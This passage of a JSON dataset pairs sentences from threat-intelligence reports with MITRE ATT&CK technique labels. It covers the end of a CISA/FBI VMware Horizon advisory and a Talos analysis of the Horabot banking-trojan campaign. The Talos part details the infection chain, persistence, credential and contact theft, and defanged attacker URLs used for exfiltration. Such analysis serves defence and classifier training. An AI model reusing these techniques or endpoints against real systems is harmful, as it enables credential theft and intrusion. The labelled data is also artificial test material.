            "Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009]. System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors\u2019 malware tests for internet connectivity by pinging 8.8.8.8. Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping)",
            "[DS0009] that may check for internet connectivity on compromised systems. ",
            "Lateral Movement Technique Title ID Use Recommendations Remote Services:",
            "Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network. ",
            "Mitigation: Use MFA for remote logins [M1032]. ",
            "Mitigation: Disable the RDP service if it is unnecessary [M1042]. ",
            "Mitigation: Do not leave RDP accessible from the internet.",
            "Enable firewall rules to block RDP traffic between network security zones within a network [M1030]. ",
            "Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP",
            "[M1026]. ",
            "Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).",
            "Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control. ",
            "Mitigation: Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists",
            "[M1037]. Detection:",
            "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure)",
            "[DS0029]. Ingress Tool Transfer T1105 ",
            "The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok. ",
            "Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. ",
            "INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC. ",
            "CISA recommends organizations apply the following steps before applying any mitigations, including patching. ",
            "Immediately isolate affected systems. ",
            "Collect and review relevant logs, data, and artifacts.",
            "Take a memory capture of the device(s) and a forensic image capture for detailed analysis. ",
            "Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation. ",
            "Report incidents to CISA via CISA\u2019s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or your local FBI field office, or",
            "FBI\u2019s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. MitigationsCISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors. ",
            "Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version. ",
            "If updates or workarounds were not promptly applied following VMware\u2019s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised.",
            "Follow the pro-active incident response procedures outlined above prior to applying updates.",
            "If no compromise is detected, apply these updates as soon as possible. ",
            "See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable. ",
            "Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.",
            "While installing the updates, ensure network perimeter access controls are as restrictive as possible. ",
            "If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds.",
            "Implement temporary solutions using an account with administrative privileges.",
            "Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. ",
            "Prior to implementing any temporary solution, ensure appropriate backups have been completed. ",
            "Verify successful implementation of mitigations by executing the vendor supplied script without parameters to ensure that no vulnerabilities remain.",
            "See KB87073 for details. ",
            "Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs). ",
            "Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations.",
            "Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services.",
            "WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic. ",
            "Use best practices for identity and access management (IAM) by implementing phishing resistant multifactor authentication (MFA), enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege.",
            "Disable inactive accounts uniformly across the AD, MFA systems, etc. ",
            "If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows , also known as the Default System Managed Account (DSMA). ",
            "Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity. ",
            "Secure accounts. ",
            "Enforce the principle of least privilege.",
            "Administrator accounts should have the minimum permission necessary to complete their tasks. ",
            "Ensure there are unique and distinct administrative accounts for each set of administrative tasks. ",
            "Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access). ",
            "Create a deny list of known compromised credentials and prevent users from using known-compromised passwords. ",
            "Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. ",
            "Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored. ",
            "Ensure storage of clear text passwords in LSASS memory is disabled.",
            "Note: For Windows 8, this is enabled by default.",
            "For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management. Consider disabling or limiting NTLM and WDigest Authentication. ",
            "Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information).",
            "For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). ",
            "Minimize the AD attack surface to reduce malicious ticket-granting activity.",
            "Malicious activity such as \u201cKerberoasting\u201d takes advantage of Kerberos\u2019 TGS and can be used to obtain hashed credentials that threat actors attempt to crack. ",
            "VALIDATE SECURITY CONTROLS ",
            "In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.",
            "CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. ",
            "To get started: Select an ATT&CK technique described in this advisory (see table 1). ",
            "Align your security technologies against the technique. ",
            "Test your technologies against the technique. ",
            "Analyze your detection and prevention technologies performance. ",
            "Repeat the process for all security technologies to obtain a set of comprehensive performance data. ",
            "Tune your security program, including people, processes, and technologies, based on the data generated by this process. ",
            "CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. ",
            "References [1] MITRE ATT&CK Version 11: Software \u2013 Ngrok Revisions Initial Version: November 16, 2022 ",
            "This product is provided subject to this Notification and this Privacy & Use policy. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1190"
            ],
            [],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1027",
                "T1562.001",
                "T1105"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [
                "T1053.005"
            ],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1053.005"
            ],
            [],
            [
                "T1021.001",
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1003.001"
            ],
            [
                "T1003.001"
            ],
            [
                "T1090"
            ],
            [],
            [
                "T1003.001"
            ],
            [],
            [
                "T1021.001"
            ],
            [
                "T1562.001"
            ],
            [],
            [
                "T1090",
                "T1021.001",
                "T1071.001"
            ],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [
                "T1190"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [
                "T1003.001"
            ],
            [],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1090",
                "T1021.001"
            ],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "New Horabot campaign targets the Americas",
        "cti_report": [
            "title: New Horabot campaign targets the Americas url: https://blog.talosintelligence.com/new-horabot-targets-americas/ Cisco Talos has observed a threat actor deploying a previously unidentified botnet program Talos is calling \u201cHorabot,\u201d which delivers a known banking trojan and spam tool onto victim machines in a campaign that has been ongoing since at least November 2020.The threat actor appears to be targeting Spanish-speaking users in the Americas and, based on our analysis, may be located in Brazil.",
            "Horabot enables the threat actor to control the victim\u2019s Outlook mailbox, exfiltrate contacts\u2019 email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim\u2019s mailbox.",
            "The banking trojan can collect the victim\u2019s login credentials for various online accounts, operating system information and keystrokes.",
            "It also steals one-time security codes or soft tokens from the victim\u2019s online banking applications.",
            "The spam tool compromises Yahoo, Gmail and Outlook webmail accounts, enabling the threat actor to take control of those mailboxes, exfiltrate their contacts\u2019 email addresses, and send spam emails.",
            "VictimologyThe attacks predominantly target users in Mexico, with a few infections in Uruguay, Brazil, Venezuela, Argentina, Guatemala and Panama.",
            "In analyzing the phishing emails used in the campaign, Talos identified that users in organizations across several business verticals \u2014 including accounting, construction and engineering, wholesale distributing and investment firms \u2014 have been affected.",
            "However, the attacker uses Horabot and the spam tool in this campaign to further propagate the attack by sending additional phishing emails to the victim\u2019s contacts, meaning Spanish-speaking users from organizations in additional verticals are likely also affected.",
            "Attacker infrastructure dates back to Nov. 2020Talos discovered that the attacker in this campaign is using multiple hosts, including an Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instance, accessed through its public URL, to host the malicious files.",
            "During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.",
            "Another malicious server, 216[.]238[.]70[.]224, hosted the ZIP file containing the payloads.",
            "This is most likely a virtual private server (VPS) behind which the attacker has parked the actual command and control (C2) server, leaving us unable to identify the actual C2.",
            "The attacker also used lookalike domains in this campaign to carry out malicious activities and evade network detection.",
            "Based on Talos\u2019 analysis of the domain registration information for the attacker\u2019s infrastructure, Talos assesses with high confidence that this campaign began in November 2020 and has been ongoing through 2023.",
            "According to WHOIS records for the domain tributaria[.]website, used in this campaign to host the attacker\u2019s tools as well as exfiltrated data, the domain was registered in July 2022 and the registrant was based out of Brazil.",
            "This domain name also resembled the legitimate Mexican Tax Agency domain, a tactic the attacker likely adopted to disguise malicious traffic.",
            "The DNS requests to tributaria[.]website, as observed in Cisco Umbrella, are shown below.",
            "In analyzing the SSL certificates of tributaria[.]website, we spotted that the certificates with serial numbers 03b6b83943ec043082a8614186921afa306b and 03eeab4d2874f31ee662ea7f602b73b05633 are shared with four other domains.",
            "Based on our analysis of the domain registration period and the URLs associated with the four domains, they belong to the same campaign that has been ongoing since at least November 2020.Malicious domainsRegistration periodm9b4s2[.]site November 2020tributaria[.]websiteJuly",
            "2022wiqp[.]xyzAugust 2022ckws[.]infoJanuary 2023amarte[.]store March 2023Multi-stage attack chain uses PowerShell downloader and DLL sideloadingThis campaign involves a multi-stage attack chain that begins with a phishing email and leads to payload delivery through the execution of a PowerShell downloader script and sideloading to legitimate executables.",
            "The infection starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification and enticing users to open the attached malicious HTML file.",
            "Sample phishing email.",
            "When a victim opens the HTML file attachment, an embedded URL is launched in the victim\u2019s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance.",
            "The content displayed on the victim\u2019s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.",
            "Disguised malicious web page.",
            "The RAR file contains a batch file with a CMD extension that is executed when the victim opens the contents of the file.",
            "The batch file downloads the PowerShell downloader script from an attacker-controlled server and executes it through the PowerShell commands.",
            "The PowerShell downloader script will download a ZIP file that contains the payload DLLs and a few legitimate executables and DLLs.",
            "It creates Windows shortcut files configured to run the payloads in the startup folder of the victim\u2019s machine and restarts the machine after 10 seconds.",
            "After the victim\u2019s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server.",
            "One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim\u2019s machine, and another is Horabot.",
            "Three-layer infection chain delivers and detonates the payloadsMalicious batch file downloads the PowerShell downloaderThe RAR file containing a malicious batch file with a .cmd extension is downloaded to the user\u2019s machine.",
            "Per the instructions on the HTML page, if the user opens the CMD file, the malicious batch script executes an embedded PowerShell command to download the next-stage PowerShell script from the server and execute it on the victim\u2019s machine.",
            "Downloader batch script.",
            "PowerShell script downloads the payloadsThe malicious PowerShell downloader script launches several processes that download the payloads and reboots the victim\u2019s machine.",
            "The script is heavily obfuscated with random symbols that substitute the instructions during the run-time and base64-encoded strings.",
            "In the initial stage of the execution, the script decodes the base64-encoded strings and initializes them.",
            "It executes a function that uses alphanumeric characters and the special character \u201c_\u201d to generate a random name and creates a folder with the random name in the root directory of the victim\u2019s machine.",
            "The random name generated by the sample during our analysis was \u201c_upyqta2_J\u201d.",
            "The script uses this random name eventually to create other folders and files.",
            "The script creates two other malicious batch scripts with the extension .cmd",
            "in the folder \u201c/Users/Public.\u201d",
            "Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.",
            "<deskto_name>S.cmd and <desktop_name>Sy.cmd are the naming conventions used.",
            "A snippet of the PowerShell downloader script.",
            "The script also creates three more Windows shortcut files in the victim\u2019s machine startup folder, with the details of the target path pointing to the folders where the payloads are eventually downloaded.",
            "The attacker used the Internet Explorer icon for the dropped shortcut files.",
            "Talos compiled a table showing the malicious Windows shortcut files and their relative paths with the command line arguments.",
            "Shortcut filesRelative pathCommand line arguments_upyqta2_JAA.lnk..\\..",
            "\\..",
            "\\..\\_upyqta2_J\\_upyqta2_Ji7.exe_upyqta2_JAT.lnk ..",
            "\\_upyqta2_J\\_upyqta2_J.exeC:\\_upyqta2_J\\_upyqta2_J.at_upyqta2_JEX.lnk..\\..",
            "\\_upyqta2_J\\_upyqta2_J.exeC:\\_upyqta2_J\\_upyqta2_J.ai_upyqta2_Jy.lnk..\\..",
            "\\Public\\DESKTOP-UT9NJ4Sy.cmd_upyqta2_J.lnk..\\..",
            "\\Public\\DESKTOP-UT9NJ4S.cmd Next, the script downloads a malicious ZIP file \u2014 \u201cm.zip\u201d \u2014 from a server using the URL \u201chxxp[://]216[.]238[.]70[.]224/20/t/e/m.zip\u201d to the random name folder.",
            "The script renames the downloaded file with a random name and deflates its contents.",
            "The deflated contents are renamed using random characters, then the malicious ZIP file is deleted.",
            "The script also writes the path of the executable file, \u201c_upyqta2_Ji7.exe\u201d, to the class\u2019s registry key \u201cHKEY_CURRENT_USER\\software\\Classes\\ms-settings\\shell\\open\\command\u201d and restarts the victim\u2019s machine after 10 seconds using the command \u201cshutdown /r /t",
            "10\u201d.",
            "The deflated contents of the malicious ZIP file are shown in the below table with their description.",
            "Files dropped Description_upyqta2_J.aiCompiled AutoIt script_upyqta2_J.atCompiled AutoIt",
            "script_upyqta2_J.exeAutoIt interpreter_upyqta2_J.iaEncrypted trojan DLL_upyqta2_J.mdatEncrypted Spam tool DLL_upyqta2_Ji7.exeKinit.exe, a legitimate executablejli.dllBanking trojan MSVCR100.dllLegitimate DLLWebView2Loader.dllLegitimate DLLMalicious shortcut files detonate the payloads after system restartAfter the PowerShell downloader reboots the victim\u2019s machine, the malicious Windows shortcut files dropped in the Windows startup folder are run, executing the payloads used in the attack.",
            "This section describes the behavior of each of the shortcut files._upyqta2_JAA.lnkThis link file \u201c_upyqta2_JAA.lnk\u201d will sideload a malicious DLL called \u201cjli.dll,\u201d a banking trojan, by executing \u201c_upyqta2_Ji7.exe,\u201d which is actually a legitimate copy of \u201ckinit.exe\u201d that the PowerShell downloader script drops._upyqta2_JEX.lnkThis link file executes the compiled AutoIt",
            "script \u201c_upyqta2_J.ai\u201d by running the executable \u201c _upyqta2_J.exe\u201d, which is a legitimate AutoIt interpreter.",
            "The AutoIt script decrypts the encrypted \u201c_upyqta2_J.ia\u201d and drops the DLL \u201c_upyqta2_J.ia.a1\u201d with a spoofed file extension that has a hardcoded malicious function \u201cA040822_1\u201d.",
            "Then, the AutoIt script will sideload the DLL \u201c_upyqta2_J.ia.a1\u201d to the AutoIt interpreter process and execute the malicious function \u201cA040822_1\u201d with the parameter \u201cSTRUCT.\u201d",
            "The decrypted malicious DLL \u201c_upyqta2_J.ia.a1\u201d is another copy of the banking trojan with additional stealer capabilities such as keylogging, copying of clipboard data, screenshot capturing and mouse tracking.",
            "A snippet of the AutoIt code _Upyqta2_J.ai_upyqta2_JAT.lnkThis link file performs the same steps as \u201c_upyqta2_JEX.lnk\u201d by executing the AutoIt script \u201c_upyqta2_J.at\u201d to decrypt \u201c _upyqta2_J.mdat\u201d and create the DLL \u201c_upyqta2_J.mdat.a1\u201d with a spoofed extension.",
            "Then, the AutoIt script sideloads the DLL to the AutoIt interpreter process and executes the malicious function \u201cB080223_AT\u201d with the parameter \u201cSTRUCT\u201d.",
            "The malicious DLL \u201c_upyqta2_J.mdat.a1\u201d is a spam tool with information-stealing capability.",
            "A snippet of the AutoIt code _",
            "Upyqta2_J.at_upyqta2_J.lnk",
            "This link file executes one of the dropped batch files, \u201c<desktop-name>S.cmd.\u201d",
            "The batch file executes an embedded PowerShell command to download the PowerShell downloader script from the attacker-controlled server using the URL hxxp[://]tributaria[.]website/esp/12/151222/up/up\u201d and executes it.",
            "The attacker uses the PowerShell downloader to reinfect the victim\u2019s machine.",
            "_",
            "upyqta2_Jy.lnkThis",
            "link file executes another dropped batch file, \u201c<desktop_name>Sy.cmd\u201d, which executes a PowerShell command to download and run the Horabot \u201cau\u201d using the URL hxxp[://]tributaria[.]website/esp/12/151222/au/au.",
            "PayloadsTalos found that the payloads employed by the attacker in this campaign are designed to steal sensitive information, evade detection and disseminate additional phishing emails to the victim\u2019s contacts.",
            "The banking trojan targets the victim\u2019s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine\u2019s clipboard data.",
            "The trojan also has anti-analysis and anti-detection capabilities to evade the sandbox and virtual environments.",
            "The spam tool and newly identified Horabot are employed in the attack to compromise the victim\u2019s mailboxes, steal their contact\u2019s email addresses, and send phishing emails to the victim\u2019s contacts.",
            "Banking trojan targets victim\u2019s login credentials and financial informationThe banking trojan identified in this campaign, a 32-bit Windows DLL written in the Delphi programming language and packed with Themida packer, can collect system information, credentials and user activity.",
            "This trojan is based on a tool called Delphi_Remote_Access_PC, which is publicly available on GitHub.",
            "It also uses similar techniques as Brazilian banking trojans reported by other security researchers at ESET and Check Point in the past.",
            "The trojan performs surveillance on the victim\u2019s machine by collecting system information such as hostnames, IPv4 address, operating system version, disk volume information, disk size and anti-virus software information, and gets the system\u2019s default language.",
            "The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request to the URL in the below format.hxxp[://]216[.]238[.]70[.]224/20/a/20/index[.]php?AT=<username>%20<hostname>%20<Operating system version>&MD=<Antivirus",
            "software>",
            "The trojan has remote desktop management capabilities such as creating and deleting directories on the victim\u2019s machine, checking if a file on the victim\u2019s filesystem exists and gets the file\u2019s attributes, collecting size and version information, and downloading files from a URL.",
            "It also has information-stealing capabilities, such as logging keystrokes via polling and application hooks, capturing screenshots, manipulating the victim\u2019s machine clipboard and tracking the mouse's events.",
            "It monitors the open application windows on the victim\u2019s desktop, overlays fake windows, and manages the pop-up windows to steal sensitive information.",
            "These pop-ups are stored in TFORMS in the RCData section of the executable.",
            "The below screenshots show some of the forms configured to steal one-time security codes or soft tokens from the victim\u2019s online banking web applications.",
            "Banking trojan forms in the binary resource section. ",
            "Talos spotted hardcoded SQL commands in the trojan binary designed to collect login data from the Google Chrome user profile folders by writing it to a database source file called \u201clogin_data.sql\u201d, and creating SQL queries to produce the database tables to store the stolen data.",
            "The dynamic analysis behavior in our analysis environment showed us that the database source file \u201clogin_data.sql\u201d contains the login details and the associated URLs from the Google Chrome database files.",
            "Database table containing the victim\u2019s credentials. ",
            "The trojan has several anti-analysis and anti-virtual machine (VM) techniques built-in to avoid analysis in automated sandboxes and to thwart debugging:",
            "Detects the presence of debuggers through APIs IsDebuggerPresent, and OutputDebugStringW, and checks for system breakpoints.",
            "Creates processes enabling the debug privileges by adjusting the process token \u201cDebug,\u201d readings the Process Environment Block, and queries the DebugPort to check if the malware is being debugged.",
            "Checks for the existence of the anti-virus products such as AVG and Avast by checking for the DLLs avghookx.dll, avghooka.dll and snxhk.dll.",
            "Detects the sandbox environments such as SunBelt and Joe sandboxes.",
            "Checks the registry keys to detect virtual environments such as VMWare, Virtual Box, Wine, Microsoft Hyper-V or Windows Virtual PC.A spam tool acts as another payload in this campaign, enabling the attacker to take over the victim\u2019s other email accounts and send spam emails to the contacts found within them.",
            "The spam tool is a 32-bit DLL written in Delphi and, when run on the victim\u2019s machine, will attempt to compromise the victim\u2019s login credentials for webmail services such as Yahoo, Gmail, and Hotmail.",
            "Upon compromising the credentials, the spam tool takes full control of the victim\u2019s email account, creates spam messages and sends them to the email IDs found in the victim\u2019s mailbox. ",
            "The tool also exfiltrates the email address to the C2 server using an HTTP POST request.",
            "The spam tool also showed us information-stealing capabilities such as logging keystrokes, capturing screenshots and tracking or intercepting the mouse events on the victim\u2019s machine.",
            "The decryption function decrypts the URL pointing to the attacker-controlled server.",
            "New Horabot deployed to spread the infectionTalos discovered Horabot, an Outlook Phishing botnet program written in PowerShell.",
            "It has embedded Visual Basic code that enables the threat actor to control the victim\u2019s Outlook mailbox, exfiltrate contacts\u2019 email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim\u2019s mailbox.",
            "Phishing emails are themed as a tax receipt or service invoice and the attacker is using the email subject and body, in the format shown below:Phishing email subject:Se adjunta la factura del servicio <calendar month in Spanish> :ATT <dd/mm/yyy> <hh:mm:ss> <AM/PM>Comprobante Fiscal Digital <calendar month in Spanish> :ATT <dd/mm/yyy> <hh:mm:ss> <AM/PM>",
            "Phishing email body: consulate los datos adjuntos, por favor.",
            "<dd/mm/yyy> <hh:mm:ss> <AM/PM>The end game of the attacker is to deliver the banking trojan to steal the victim's creds and financial data, along with it they are delivering Horabot and separate spam tool to propagate the infection by sending the phishing emails to all of the validated email IDs in the victim's mailbox.",
            "Attacker is using this technique to minimise the chances of their phishing infracture being tracked.",
            "Horabot, during its initial phase of execution, initializes the victim\u2019s desktop Outlook application by loading \u201cMicrosoft.",
            "Office.",
            "Interop.",
            "Outlook\u201d namespace to the PowerShell instance to create the Outlook application object for loading the MAPI namespace.",
            "The script also initializes an array to store the stolen email addresses and creates a folder called \u201ca160323\u201d in \u201cC:\\Users\\Public\\.\u201d as an infection marker.",
            "A function that initializes the outlook application object. ",
            "After initialization, the script looks for the Outlook data files from the victim profile\u2019s Outlook application data folder.",
            "It loads and accesses the victim\u2019s address book and contacts if they exist.",
            "It enumerates all folders and emails in the victim\u2019s Outlook data file and extracts email addresses from the emails\u2019 sender, recipients, CC and BCC fields.",
            "During this process, the script checks the \u201cAddressEntryUserType\u201d object values to determine if the email address is one of the types listed below:Exchange agentExchange organizationExchange distribution listExchange public folderAddress that belongs to the same or different exchange forestAddress that uses Lightweight Directory Access Protocol",
            "[LDAP]Address that uses Simple Mail Transfer Protocol",
            "[SMTP]Function that enumerates and collects email addresses.",
            "The script has an email address format validation function that compares all of the extracted email addresses with a regular expression.",
            "After they are successfully validated, the addresses are added to the email address collection array.",
            "A function that validates email address format. ",
            "Next, the script writes the extracted email addresses from the array to a file called \u201c.Outlook\u201d created by the script in the roaming user profile\u2019s",
            "Microsoft application data folder.",
            "Then the script encodes the email addresses in the \u201c.Outlook\u201d file to a data stream.",
            "Using the GetRequestStream function, the script requests a data stream from the C2 server through the URL hxxp[://]139[.]177[.]193[.]74/esp/12/151222/au/tst/index[.]php?list and upon the successful response, the encoded email addresses are exfiltrated.",
            "A function that exfiltrates email addresses.",
            "After exfiltrating the email addresses, the script creates a folder \u201cfb\u201d in the Public user folder and creates an HTML file in it, named \u201cadjuntos_1503.html\u201d in our sample analysis.",
            "Then the script downloads the contents of an HTML file stored in an attacker-controlled server and writes it to the HTML file dropped in the \u201cfb\u201d folder.",
            "The HTML file has an embedded malicious URL \u201chxxps[://]facturacionmarzo[.]cloud/e/archivos[.]pdf[.]html\u201d in its metadata section.",
            "Next, the script constructs an email with a hardcoded subject and body and attaches the HTML file from the \u201cfb\u201d folder.",
            "Then the phishing email is sent to the list of extracted email addresses one at a time, deleting the \u201cfb\u201d folder to cover its paths and avoid detection.",
            "A function that sends phishing emails.",
            "CoverageCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.",
            "Try Secure Endpoint for free here.",
            "Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.",
            "Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.",
            "You can try Secure Email for free here.",
            "Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.",
            "Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.",
            "Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.",
            "Sign up for a free trial of Umbrella here.",
            "Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.",
            "Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.",
            "Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.",
            "Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.",
            "Snort SIDs for this threat are 61839-61856 for Snort 2 and 300569-300577 for Snort 3.ClamAV detections are available for this threat:Txt.Loader.",
            "Horabot-10003071-0Ps1.Downloader.",
            "Horabot-10003078-0Win.",
            "Trojan.",
            "DelphiTrojanBanking-10003087-0Win.",
            "DelphiTrojanBanking-10003088-0Txt.Malware.",
            "Horabot-10003089-0Txt.Malware.",
            "Horabot-10003090-0Txt.Malware.",
            "Horabot-10003091-0Win.",
            "Tool.",
            "HorabotSpamTool-10003092-0IOCsIndicators of Compromise associated with this threat can be found here. "
        ],
        "label": [
            [],
            [
                "T1566.001"
            ],
            [
                "T1566.001",
                "T1056.001",
                "T1078",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [
                "T1071.001"
            ],
            [
                "T1105"
            ],
            [
                "T1105"
            ],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [
                "T1036.005"
            ],
            [],
            [],
            [],
            [
                "T1574.002",
                "T1566.001",
                "T1059.003"
            ],
            [
                "T1566.001",
                "T1204.002"
            ],
            [],
            [
                "T1090",
                "T1027"
            ],
            [
                "T1105",
                "T1204.002"
            ],
            [
                "T1105"
            ],
            [
                "T1059.003",
                "T1204.002"
            ],
            [
                "T1105",
                "T1059.003"
            ],
            [
                "T1105",
                "T1055"
            ],
            [
                "T1547.001"
            ],
            [
                "T1574.002",
                "T1105",
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [
                "T1059.003",
                "T1204.002"
            ],
            [],
            [
                "T1105",
                "T1543.003"
            ],
            [
                "T1027"
            ],
            [
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [
                "T1547.001"
            ],
            [],
            [],
            [
                "T1547.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [
                "T1070.004"
            ],
            [
                "T1112"
            ],
            [],
            [],
            [],
            [
                "T1547.001"
            ],
            [
                "T1574.002",
                "T1027"
            ],
            [
                "T1027",
                "T1036.005"
            ],
            [
                "T1105",
                "T1140"
            ],
            [
                "T1574.002"
            ],
            [
                "T1113",
                "T1056.001"
            ],
            [
                "T1140"
            ],
            [
                "T1574.002"
            ],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1105",
                "T1059.003"
            ],
            [],
            [],
            [],
            [
                "T1105",
                "T1059.003"
            ],
            [
                "T1027",
                "T1566.001"
            ],
            [
                "T1078",
                "T1056.001"
            ],
            [],
            [],
            [
                "T1078",
                "T1082"
            ],
            [],
            [],
            [
                "T1518.001",
                "T1082"
            ],
            [
                "T1041"
            ],
            [],
            [
                "T1105",
                "T1083"
            ],
            [
                "T1113",
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [
                "T1005",
                "T1074.001"
            ],
            [],
            [],
            [],
            [],
